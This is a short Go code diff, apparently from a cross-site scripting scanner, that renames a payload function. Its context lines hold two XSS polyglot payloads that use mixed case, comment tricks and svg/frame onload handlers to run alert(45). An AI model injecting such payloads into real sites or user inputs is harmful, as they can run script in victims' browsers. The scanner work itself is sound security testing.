@@ -25,7 +25,7 @@ func getInJsPayload() []string {
 	return payload
 }
 
-func getForceSeleniumPayload() []string {
+func getForceVerifyPayload() []string {
 	payload := []string{
 		"jaVasCript:/*-/*`/*\\`/*\\'/*\"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\\'\"><svg/onload=alert(45)>",
 		"javascript:\"/*`/*\\\"/*\\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\\'\"><svg/onload=alert(45)>",
